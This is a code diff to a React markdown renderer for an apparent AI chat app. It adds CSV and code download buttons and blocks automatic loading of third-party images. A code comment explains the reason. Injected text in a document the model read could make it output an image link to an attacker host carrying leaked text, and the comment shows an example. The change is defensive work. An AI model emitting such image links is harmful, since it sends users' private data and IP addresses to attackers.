@@ -11,7 +11,7 @@ import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
 import type { Schema } from 'hast-util-sanitize';
 import type { PluggableList } from 'unified';
 import 'katex/dist/katex.min.css';
-import { Box, Flex, Text, Heading } from '@radix-ui/themes';
+import { Box, Button, Flex, Text, Heading } from '@radix-ui/themes';
 import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
 import { oneLight, oneDark } from 'react-syntax-highlighter/dist/esm/styles/prism';
 import { InlineCitationBadge, InlineCitationGroup } from './response-tabs/citations';
@@ -26,8 +26,12 @@ import { parseCsvContent, parseCsvCellContent } from './csv-utils';
 import { MaterialIcon } from '@/app/components/ui/MaterialIcon';
 import { useThemeAppearance } from '@/app/components/theme-provider';
 import { useTranslation } from 'react-i18next';
+import { useIsMobile } from '@/lib/hooks/use-is-mobile';
+import { useCopyText } from '@/lib/hooks/use-copy-text';
 import type { Root, Blockquote } from 'mdast';
 import { splitMarkdownBlocks } from '../../utils/split-streaming-markdown';
+import { downloadCode } from '../../utils/code-download';
+import { downloadTableCsv, tableNodeToRows, type TableNode } from '../../utils/table-csv';
 
 /**
  * rehype-sanitize schema.
@@ -473,29 +477,154 @@ function TableRow({ children }: { children?: React.ReactNode }) {
 }
 
 /**
- * Fenced code block with a header bar (language label + copy button)
+ * Third-party image hosts are not fetched automatically. A document the model
+ * read can carry an injected `![](https://attacker/?q=<leaked text>)`, and an
+ * automatic fetch would both exfiltrate that query string and hand the host the
+ * reader's IP. Same-origin and relative sources are ours, so they load as-is.
+ */
+function isThirdPartyImageSrc(src: string): boolean {
+  if (!src || src.startsWith('#')) return false;
+  if (src.startsWith('/') && !src.startsWith('//')) return false;
+  try {
+    return new URL(src, window.location.href).origin !== window.location.origin;
+  } catch {
+    return false;
+  }
+}
+
+function imageHostLabel(src: string): string {
+  try {
+    return new URL(src, window.location.href).hostname;
+  } catch {
+    return src;
+  }
+}
+
+function MarkdownImage({ src, alt }: { src?: string; alt?: string }) {
+  const { t } = useTranslation();
+  const isMobile = useIsMobile();
+  const [isAllowed, setIsAllowed] = useState(false);
+  const needsConsent = Boolean(src) && !isAllowed && isThirdPartyImageSrc(src!);
+
+  return (
+    <Box as="span" style={{ margin: 'var(--space-3) 0', textAlign: 'center', display: 'block' }}>
+      {needsConsent ? (
+        <Flex
+          as="span"
+          direction="column"
+          align="center"
+          gap="2"
+          style={{
+            padding: 'var(--space-4)',
+            border: '1px dashed var(--slate-7)',
+            borderRadius: 'var(--radius-2)',
+            backgroundColor: 'var(--slate-2)',
+          }}
+        >
+          <MaterialIcon name="image_not_supported" size={24} color="var(--slate-9)" />
+          <Text size="1" as="span" style={{ color: 'var(--slate-11)' }}>
+            {t('chatStream.remoteImageBlocked')}
+          </Text>
+          <Text size="1" as="span" style={{ color: 'var(--slate-10)', wordBreak: 'break-all' }}>
+            {t('chatStream.remoteImageFrom', { host: imageHostLabel(src!) })}
+          </Text>
+          <Button
+            type="button"
+            size="1"
+            variant="soft"
+            color="gray"
+            style={isMobile ? { minWidth: 44, minHeight: 44 } : undefined}
+            onClick={() => setIsAllowed(true)}
+          >
+            {t('chatStream.remoteImageLoad')}
+          </Button>
+        </Flex>
+      ) : (
+        <img
+          src={src}
+          alt={alt ?? ''}
+          loading="lazy"
+          referrerPolicy="no-referrer"
+          style={{
+            maxWidth: '100%',
+            height: 'auto',
+            borderRadius: 'var(--radius-2)',
+            border: '1px solid var(--slate-5)',
+            display: 'inline-block',
+          }}
+        />
+      )}
+      {alt && (
+        <Text
+          size="1"
+          as="span"
+          style={{ color: 'var(--slate-10)', marginTop: 'var(--space-1)', fontStyle: 'italic', display: 'block' }}
+        >
+          {alt}
+        </Text>
+      )}
+    </Box>
+  );
+}
+
+/** An icon-and-text button in a code block's header bar. `active` shows the confirmed state. */
+function CodeHeaderButton({
+  icon,
+  label,
+  active = false,
+  onClick,
+}: {
+  icon: string;
+  label: string;
+  active?: boolean;
+  onClick: () => void;
+}) {
+  const [isHovered, setIsHovered] = useState(false);
+  const color = active ? 'var(--accent-11)' : 'var(--slate-11)';
+
+  return (
+    <button
+      type="button"
+      onClick={onClick}
+      onMouseEnter={() => setIsHovered(true)}
+      onMouseLeave={() => setIsHovered(false)}
+      style={{
+        display: 'inline-flex',
+        alignItems: 'center',
+        gap: '4px',
+        background: isHovered ? 'var(--slate-4)' : 'transparent',
+        border: 'none',
+        cursor: 'pointer',
+        padding: '3px 8px',
+        borderRadius: 'var(--radius-1)',
+        fontFamily: 'inherit',
+        color,
+        transition: 'background 0.15s ease, color 0.15s ease',
+      }}
+    >
+      <MaterialIcon name={icon} size={13} color={color} />
+      <Text size="1" style={{ color: 'inherit' }}>
+        {label}
+      </Text>
+    </button>
+  );
+}
+
+/**
+ * Fenced code block with a header bar (language label + download and copy buttons)
  * and syntax-highlighted body that adapts to light / dark theme.
  */
 function CodeBlock({ language, codeText }: { language: string; codeText: string }) {
-  const [copied, setCopied] = useState(false);
-  const [isHovered, setIsHovered] = useState(false);
+  const { copied, copy } = useCopyText();
   const { appearance } = useThemeAppearance();
   const isDark = appearance === 'dark';
   const { t } = useTranslation();
-
-  const handleCopy = () => {
-    navigator.clipboard.writeText(codeText).then(() => {
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    }).catch(() => {});
-  };
 
   // CSS variables resolve light/dark automatically — no manual isDark checks needed.
   const headerBg = 'var(--slate-2)';
   const headerBorder = 'var(--slate-6)';
   const bodyBg = 'var(--slate-1)';
   const labelColor = 'var(--slate-11)';
-  const btnHoverBg = 'var(--slate-4)';
 
   return (
     <Box
@@ -528,34 +657,19 @@ function CodeBlock({ language, codeText }: { language: string; codeText: string 
         >
           {language || 'text'}
         </Text>
-        <button
-          type="button"
-          onClick={handleCopy}
-          onMouseEnter={() => setIsHovered(true)}
-          onMouseLeave={() => setIsHovered(false)}
-          style={{
-            display: 'inline-flex',
-            alignItems: 'center',
-            gap: '4px',
-            background: isHovered ? btnHoverBg : 'transparent',
-            border: 'none',
-            cursor: 'pointer',
-            padding: '3px 8px',
-            borderRadius: 'var(--radius-1)',
-            fontFamily: 'inherit',
-            color: copied ? 'var(--accent-11)' : labelColor,
-            transition: 'background 0.15s ease, color 0.15s ease',
-          }}
-        >
-          <MaterialIcon
-            name={copied ? 'check' : 'content_copy'}
-            size={13}
-            color={copied ? 'var(--accent-11)' : labelColor}
+        <Flex align="center" gap="1">
+          <CodeHeaderButton
+            icon="download"
+            label={t('action.download')}
+            onClick={() => downloadCode(codeText, language)}
           />
-          <Text size="1" style={{ color: 'inherit' }}>
-            {copied ? t('chatStream.copiedCode') : t('chatStream.copyCode')}
-          </Text>
-        </button>
+          <CodeHeaderButton
+            icon={copied ? 'check' : 'content_copy'}
+            label={copied ? t('chatStream.copiedCode') : t('chatStream.copyCode')}
+            active={copied}
+            onClick={() => void copy(codeText)}
+          />
+        </Flex>
       </Flex>
 
       {/* Syntax-highlighted code body */}
@@ -887,8 +1001,9 @@ export function createMarkdownComponents(
             if (rows.length >= 1) {
               const [header, ...dataRows] = rows;
               return (
-                <TableFullscreenWrapper>
+                <TableFullscreenWrapper onDownloadCsv={() => downloadTableCsv(rows)}>
                   <Box
+                    data-table-scroll-area
                     style={{
                       overflowX: 'auto',
                       overflowY: 'auto',
@@ -1045,29 +1160,7 @@ export function createMarkdownComponents(
       />
     ),
     img: ({ src, alt }: { src?: string; alt?: string }) => (
-      <Box as="span" style={{ margin: 'var(--space-3) 0', textAlign: 'center', display: 'block' }}>
-        <img
-          src={src}
-          alt={alt ?? ''}
-          loading="lazy"
-          style={{
-            maxWidth: '100%',
-            height: 'auto',
-            borderRadius: 'var(--radius-2)',
-            border: '1px solid var(--slate-5)',
-            display: 'inline-block',
-          }}
-        />
-        {alt && (
-          <Text
-            size="1"
-            as="span"
-            style={{ color: 'var(--slate-10)', marginTop: 'var(--space-1)', fontStyle: 'italic', display: 'block' }}
-          >
-            {alt}
-          </Text>
-        )}
-      </Box>
+      <MarkdownImage src={src} alt={alt} />
     ),
     a: ({ href, children }: { href?: string; children?: React.ReactNode }) => (
       <a
@@ -1084,9 +1177,10 @@ export function createMarkdownComponents(
         {processChildren(children, citationMapsRef.current, citationCallbacksRef.current)}
       </a>
     ),
-    table: ({ children }: { children?: React.ReactNode }) => (
-      <TableFullscreenWrapper>
+    table: ({ children, node }: { children?: React.ReactNode; node?: TableNode }) => (
+      <TableFullscreenWrapper onDownloadCsv={() => downloadTableCsv(tableNodeToRows(node))}>
         <Box
+          data-table-scroll-area
           style={{
             overflowX: 'auto',
             overflowY: 'auto',
